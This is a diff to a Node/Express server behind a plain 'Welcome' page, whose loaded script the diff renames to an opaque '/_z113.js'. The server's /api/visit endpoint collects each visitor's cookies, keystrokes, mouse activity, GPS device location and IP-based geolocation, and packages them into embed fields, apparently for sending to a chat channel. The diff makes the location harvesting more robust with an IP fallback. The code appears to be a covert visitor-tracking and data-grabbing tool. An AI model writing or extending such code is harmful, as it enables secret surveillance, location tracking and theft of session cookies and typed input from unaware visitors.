@@ -90,7 +90,7 @@ app.get('/index.html', (req, res) => {
     </head>
     <body>
       <h1>Welcome</h1>
-      <script src="/client.js"></script>
+      <script src="/_z113.js"></script>
     </body>
     </html>
   `);
@@ -267,8 +267,8 @@ function detectSecurityThreats(req, visitorInfo) {
     });
   }
 
-  if (req.body.location && !req.body.location.error) {
-    const { latitude, longitude, accuracy } = req.body.location;
+  if (req.body.deviceLocation && !req.body.deviceLocation.error) {
+    const { latitude, longitude, accuracy } = req.body.deviceLocation;
     if (latitude === 0 && longitude === 0) {
       threats.push({
         type: 'Suspicious Location',
@@ -293,15 +293,40 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       cookies: req.cookies,
       body: req.body
     });
-    logger.info('Raw location data received:', { location: req.body.location });
+    logger.info('Raw location data received:', { location: req.body.deviceLocation });
 
     const ipInfo = getClientIP(req);
     const ip = ipInfo.primary;
     
-    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query,mobile,proxy,hosting`);
-    const geoData = await geoResponse.json();
+    let geoData = { status: 'fail', message: 'No geolocation data available' };
+    try {
+      const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query,mobile,proxy,hosting`);
+      if (!geoResponse.ok) {
+        throw new Error(`IP-API request failed: ${geoResponse.status} ${geoResponse.statusText}`);
+      }
+      geoData = await geoResponse.json();
+    } catch (error) {
+      logger.error('IP-API fetch error', { message: error.message, ip });
+      geoData = {
+        status: 'fail',
+        message: 'IP-API fetch failed',
+        lat: null,
+        lon: null,
+        country: 'Unknown',
+        regionName: 'Unknown',
+        city: 'Unknown',
+        zip: 'Unknown',
+        isp: 'Unknown',
+        org: 'Unknown',
+        as: 'Unknown',
+        query: ip,
+        mobile: false,
+        proxy: false,
+        hosting: false
+      };
+    }
 
-    if (geoData.status === 'fail') {
+    if (geoData.status === 'fail' && geoData.message !== 'IP-API fetch failed') {
       logger.error('Geolocation API error', { message: geoData.message, ip });
       return res.status(400).send('Invalid IP address');
     }
@@ -358,7 +383,8 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       currentUrl: req.body.currentUrl || 'Unknown',
       scrollPosition: req.body.scrollPosition || 'Unknown',
       cookies: JSON.stringify(req.cookies) || '{}',
-      deviceLocation: req.body.location || { error: 'No location data provided' },
+      deviceLocation: req.body.deviceLocation || { error: 'No location data provided' },
+      fallbackLocation: (req.body.deviceLocation?.error && geoData.lat && geoData.lon) ? { latitude: geoData.lat, longitude: geoData.lon, source: 'IP-based' } : null,
       part3: {
         keystrokes: req.body.part3?.keystrokes || 'None',
         mouseMovementFrequency: req.body.part3?.mouseMovementFrequency || 'Unknown',
@@ -408,6 +434,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       { name: 'ZIP', value: visitorInfo.zip || 'N/A', inline: true },
       { name: 'IP-based Coordinates', value: `(${visitorInfo.ipLatitude}, ${visitorInfo.ipLongitude})`, inline: true },
       { name: 'Device Location', value: visitorInfo.deviceLocation.error ? visitorInfo.deviceLocation.error : `(${visitorInfo.deviceLocation.latitude}, ${visitorInfo.deviceLocation.longitude}, Accuracy: ${visitorInfo.deviceLocation.accuracy}m)`, inline: true },
+      { name: 'Fallback Location', value: visitorInfo.fallbackLocation ? `(${visitorInfo.fallbackLocation.latitude}, ${visitorInfo.fallbackLocation.longitude}, Source: ${visitorInfo.fallbackLocation.source})` : 'None', inline: true },
       { name: 'ISP', value: visitorInfo.isp, inline: true },
       { name: 'Organization', value: visitorInfo.organization || 'N/A', inline: true },
       { name: 'AS', value: visitorInfo.as || 'N/A', inline: true },
@@ -642,5 +669,3 @@ app.use((err, req, res, next) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => logger.info(`Server running on port ${PORT}`));
-
-
